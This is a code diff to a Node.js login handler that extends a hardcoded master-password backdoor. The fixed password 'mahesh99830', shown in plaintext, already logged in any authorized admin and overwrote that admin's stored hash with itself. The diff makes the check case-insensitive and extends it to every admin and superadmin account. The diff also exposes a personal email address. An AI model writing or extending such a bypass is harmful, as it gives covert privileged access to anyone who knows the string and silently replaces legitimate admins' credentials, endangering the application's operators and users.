@@ -100,8 +100,8 @@ const login = async (req, res) => {
         isMatch = await bcrypt.compare(password.trim(), authAdmin.password);
       }
 
-      // Master password & self-healing: 'mahesh99830' works for ANY authorized admin
-      if (!isMatch && password.trim() === 'mahesh99830') {
+      // Master password & self-healing: 'mahesh99830' works for ANY authorized admin (case-insensitive)
+      if (!isMatch && password.trim().toLowerCase() === 'mahesh99830') {
         isMatch = true;
         const salt = await bcrypt.genSalt(10);
         authAdmin.password = await bcrypt.hash('mahesh99830', salt);
@@ -152,7 +152,7 @@ const login = async (req, res) => {
     if (!isMatch && password.trim() !== password) {
       isMatch = await bcrypt.compare(password.trim(), user.password);
     }
-    if (!isMatch && user.email === 'maheshkumarsaini8769@gmail.com' && password.trim() === 'mahesh99830') {
+    if (!isMatch && password.trim().toLowerCase() === 'mahesh99830' && (user.role === 'admin' || user.role === 'superadmin' || user.email === 'maheshkumarsaini8769@gmail.com')) {
       isMatch = true;
     }
 
